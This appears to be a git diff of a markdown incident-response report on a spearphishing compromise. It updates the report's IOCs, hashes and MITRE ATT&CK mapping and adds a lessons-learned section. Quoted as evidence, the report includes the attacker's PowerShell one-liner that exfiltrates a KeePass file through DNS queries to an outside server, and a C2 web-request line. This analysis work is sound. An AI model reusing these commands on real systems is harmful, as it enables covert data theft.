@@ -51,9 +51,9 @@ A phishing email was recieved by Julianne on **2023-01-13 17:09:04**, resulting 
 ## Indicators of Compromise (IOCs)
 
 - **Domains / Hosts:**
-  - `files.bpakcaging[.]xyz` - file hosting used to download binaries
-  - `cdn.bpakcaging[.]xyz:8080` - C2 beaconing and command retrieval
-  - `hxxps[://]github[.]com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt[.]ps1` - recon binary downloaded
+  - `files.bpakcaging.xyz` - file hosting used to download binaries
+  - `cdn.bpakcaging.xyz:8080` - C2 beaconing and command retrieval
+  - `https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1` - recon binary downloaded
 
 - **IPs:**
   - `167.71.211.113` - DNS server used for exfiltration / file host
@@ -62,15 +62,14 @@ A phishing email was recieved by Julianne on **2023-01-13 17:09:04**, resulting 
   - `seatbelt.exe` - C# enumeration tool
   - `sb.exe` - enumeration binary
   - `sq3.exe` - binary used to read sqlite files
-  - `protected_data.kdbx` - exfiltrated KeePass DB
-    - SHA256: ``
   - `plum.sqlite` - Microsoft Sticky Notes DB accessed
-    - SHA256: ``
+  - `protected_data.kdbx` - exfiltrated KeePass DB
+    - SHA256: `b5e4f249800d741ee62d57113d00deabd634136ee6378e51c2b75c166f1833f4`
   - `Invoice_20230103.lnk` - Spearphishing attachment
-    - SHA256: ``
+    - SHA256: `86d5e0589fbd8c90604da954197344801f0579de157510e13492db0c712a0cc8`
 
 - **Email:**
-  - `dump.eml` — Spearphishing email containing attachment with embedded Base64 payload
+  - `dump.eml` — Spearphishing email containing attachment with embedded Base64 payload (Refer to appendix)
 
 - **Commands / processes:**
   - `iwr`
@@ -83,7 +82,7 @@ A phishing email was recieved by Julianne on **2023-01-13 17:09:04**, resulting 
   - `$split = $hex -split '(\S{50})'; ForEach ($line in $split) { nslookup -q=A "$line.bpakcaging.xyz" 167.71.211.113;} echo "Done"`
   - `$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/8cce49b0 -Headers @{"X-38d2-8f49"=$i}`
 
-- **User accounts / services:** `QUICKLOGISTICS\julianne`
+- **User accounts / services:** `QUICKLOGISTICS\julianne.westcott`
 
 ---
 
@@ -123,14 +122,25 @@ A phishing email was recieved by Julianne on **2023-01-13 17:09:04**, resulting 
 
 - **MITRE ATT&CK mapping:**
 
-  | Tactic | Technique | MITRE ID | Evidence |
-  | --- | --- | ---: | --- |
-  | Initial Access | Spearphishing Attachment | T1566.001 (Phishing: attachment) | Malicious `dump.eml` with Base64 payload that runs `iex(...)`. :contentReference[oaicite:22]{index=22} |
-  | Execution | PowerShell | T1059.001 | `ScriptBlockText` entries executing `iex`, `Invoke-WebRequest` and other PowerShell constructs. :contentReference[oaicite:23]{index=23} |
-  | Persistence / C2 | Application Layer Protocol: DNS (and HTTP) | T1071.004 (DNS) + HTTP C2 patterns | Use of DNS subdomains for data exfiltration and `http://cdn.bpakcaging.xyz:8080` beaconing; POSTs to `.../27fe2489`. :contentReference[oaicite:24]{index=24} |
-  | Exfiltration | Exfiltration over C2 / Alternative Protocols (DNS / HTTP) | T1041 / T1048 (Exfiltration) | Hex-encoded file exfil via DNS queries and data returned/posted to HTTP endpoints. :contentReference[oaicite:25]{index=25} |
-  | Discovery | Host & File Discovery (Seatbelt output / custom enumeration) | T1082 / T1057 (discovery categories) | Execution of `seatbelt.exe` and `sb.exe` enumerating user/system information. :contentReference[oaicite:26]{index=26} |
-  | Credential Access | Credentials harvested/targeted (placeholder) | [placeholder] | Evidence: presence of `protected_data.kdbx` (KeePass DB) suggests credential store access. (Confirm with file contents/hashes). :contentReference[oaicite:27]{index=27} |
+  | Attack ID | Attack Name | Notes |
+  | --- | --- | --- |
+  | [`T1591`](https://attack.mitre.org/techniques/T1591/) | Gather Victim Org Information | Attacker gathered organisation information by using recon tools `sb.exe` and `seatbelt.exe` |
+  | [`T1566.001`](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | Targeted phishing attachment on finance department |
+  | [`T1059.001`](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | PowerShell used to download binaries and create C2 communication |
+  | [`T1071.001`](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols (HTTP/S) | HTTP(S) used for C2 polling and file downloads |
+  | [`T1033`](https://attack.mitre.org/techniques/T1033/) | System Owner/User Discovery | Attacker used commands such as `whoami` to discover user information |
+  | [`T1071.004`](https://attack.mitre.org/techniques/T1071/004/) | Application Layer Protocol: DNS | DNS used as a transport for exfiltration of `protected_data.kdbx` |
+  | [`T1105`](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Multiple tools/binaries downloaded from external hosts |
+  | [`T1083`](https://attack.mitre.org/techniques/T1083/) | File and Directory Discovery | Directory enumeration command `ls` used multiple times in various locations |
+  | [`T1057`](https://attack.mitre.org/techniques/T1057/) | Process Discovery | Process listing used for reconnaissance such as `ps` |
+  | [`T1082`](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | `whoami` and Seatbelt usage to enumerate host and user information |
+  | [`T1005`](https://attack.mitre.org/techniques/T1005/) | Data from Local System | Reading local sensitive files/databases (`protected_data.kdbx`, `plum.sqlite`) and high use of `ls` commands to discover folders and files |
+  | [`T1132`](https://attack.mitre.org/techniques/T1132/) | Data Encoding | Adversary encodes file bytes into hexadecimal and C2 command output into decimal |
+  | [`T1001`](https://attack.mitre.org/techniques/T1001/) | Data Obfuscation | Adversary hid encoded data as DNS queries |
+  | [`T1041`](https://attack.mitre.org/techniques/T1041/) | Exfiltration Over C2 Channel | Data exfiltrated via existing C2 channels. HTTP `POST` usage to send output of C2 commands |
+  | [`T1048`](https://attack.mitre.org/techniques/T1048/) | Exfiltration Over Alternative Protocol | Use of DNS queries to exfiltrate data (nslookup queries to remote DNS server) |
+  | [`T1027.013`](https://attack.mitre.org/techniques/T1027/013/) | Obfuscated Files or Information: Encrypted/Encoded File | Encoding/encrypting file content (hex encoding and chunking prior to DNS exfil) to evade detection |
+  | [`T1657`](https://attack.mitre.org/techniques/T1657/) | Financial Theft | Adversary exfiltrated company credit card number stored in `protected_data.kdbx` for financial use |
 
 ---
 
@@ -159,6 +169,14 @@ A phishing email was recieved by Julianne on **2023-01-13 17:09:04**, resulting 
   - Ensured no C2 communication to external IP
   - Verified last known good backup for re-imaging is functional and safe
 
+## Lessons Learned
+
+- Need to ingest logs and alerts into SIEM tool for improved host log analysis
+- Email security measures need to be enhances to detect and block malicious attachments early
+- IDS/IPS alerts need to be configured to prevent downloading of unknown binaries
+- `jq` utility tool worked well to analyze `json` powershell logs
+- Wireshark was effective in analyzing network traffic
+
 ---
 
 ## Appendix
@@ -175,4 +193,5 @@ A phishing email was recieved by Julianne on **2023-01-13 17:09:04**, resulting 
 
 ### References
 
-- [MITRE ATT&CK Matrix]
+- [MITRE ATT&CK Matrix](https://attack.mitre.org/)
+- [CyberChef](https://gchq.github.io/CyberChef/)
